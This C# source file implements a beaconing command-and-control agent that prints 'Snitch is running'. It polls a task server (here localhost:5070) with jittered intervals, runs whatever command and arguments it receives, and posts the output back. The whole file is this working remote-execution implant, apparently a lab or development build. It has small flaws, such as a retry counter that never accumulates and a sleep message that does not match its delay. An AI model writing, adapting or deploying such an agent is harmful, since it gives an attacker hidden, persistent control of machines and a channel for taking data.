using System.Net.Http.Json;
using BackOffice.Models;
using CliWrap;
using CliWrap.Buffered;

public class Program
{
    private static readonly HttpClient client = new HttpClient();

    public static async Task Main()
    {
        while (true)
        {

            int failCount = 0;
            try
            {
                var config = await FetchConfig();
                Console.WriteLine("Config Fetched");
                Random random = new Random();
                Console.WriteLine("Snitch is running");
                while (true)
                {
                    await Reachout();
                    var jitter = random.Next(1000, 3000);
                    Thread.Sleep(4000 + jitter);
                }
            }
            catch(HttpRequestException)
            {
                Console.WriteLine("HTTP Exception: Sleeping for 30 seconds");
                Thread.Sleep(30000);
            }
            catch (Exception)
            {
                failCount++;
                if (failCount > 10)
                {
                    Console.WriteLine("Exception: Sleeping for 30 seconds");
                    Thread.Sleep(10000);
                }
            }
        }
    }

    private static async Task<WireConfig> FetchConfig()
    {
        return await client.GetFromJsonAsync<WireConfig>("http://localhost:5070/config");
    }

    private static async Task Reachout()
    {
        try
        {
            var httpResponse = await client.GetFromJsonAsync<WireTask>("http://localhost:5070/tasks");
            if (httpResponse.Id != Guid.Empty)
            {
                var commandResult = await Cli.Wrap(httpResponse.Command)
                                .WithArguments(httpResponse.Args)
                                .ExecuteBufferedAsync();

                await client.PostAsJsonAsync("http://localhost:5070/tasks", new WireResponse()
                {
                    Id = httpResponse.Id,
                    Output = commandResult.StandardOutput
                });
            }
        }
        catch (Exception ex)
        {
            throw;
        }
    }
}